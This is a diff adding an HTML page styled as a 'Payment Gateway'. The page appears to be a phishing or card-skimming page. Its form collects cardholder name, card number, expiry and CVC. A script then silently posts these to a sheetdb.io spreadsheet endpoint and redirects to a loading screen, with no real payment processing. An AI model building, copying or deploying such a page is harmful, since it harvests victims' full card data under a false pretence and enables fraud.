@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://cdn0.iconfinder.com/data/icons/cash-card-starters-colored/48/JD-09-512.png" type="image/x-icon" />
+    <title>Pay-with-card</title>
+    <link href="card-payment.css"  rel="stylesheet" >
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css">
+</head>
+<body>
+    <form  action="https://sheetdb.io/api/v1/mtaai00jhsl3k"   method="POST" id="sheetdb-form"    >
+        <div class="wrapper">
+          <div class="payment">
+      
+            <h2>Payment Gateway</h2>
+            <div class="form">
+              <div class="card space icon-relative">
+                <label class="label">Card holder:</label>
+                <input type="text" class="input"  name="data[card holders name]" placeholder="Card holders name"   required >
+                <i class="fas fa-user"></i>
+              </div>
+              <div class="card space icon-relative">
+                <label class="label">Card number:</label>
+                <input type="text" class="input" data-mask="0000 0000 0000 0000"  name="data[card no]" placeholder="Card Number"   required >
+                <i class="far fa-credit-card"></i>
+              </div>
+              <div class="card-grp space">
+                <div class="card-item icon-relative">
+                  <label class="label">Expiry date:</label>
+                  <input type="text"  class="input"  name="data[expiry-date]"  placeholder="00 / 00"   required >
+                  <i class="far fa-calendar-alt"></i>
+                </div>
+                <div class="card-item icon-relative">
+                  <label class="label">CVC:</label>
+                  <input type="text" class="input" data-mask="000"  name="data[cvv]" placeholder="000"    required >
+                  <i class="fas fa-lock"></i>
+                </div>
+              </div>
+            
+              <button type="submit" >Pay Now</button>
+
+            </div>
+          </div>
+        </div>
+      
+      </form>
+      
+      
+      <script>
+        
+        var form = document.getElementById('sheetdb-form');
+         form.addEventListener("submit", e => {
+           e.preventDefault();
+           fetch(form.action, {
+               method : "POST",
+               body: new FormData(document.getElementById("sheetdb-form")),
+           }).then(
+               response => response.json()
+           ).then((html) => {
+          
+             window.open('loadingscreen.html', '_self');
+      
+           });
+         });
+
+        
+      </script>
+      
+          <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+          <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+          <script>$("input[name='data[expiry-date]'").mask("00 / 00");</script>
+      
+    
+    
+</body>
+</html>
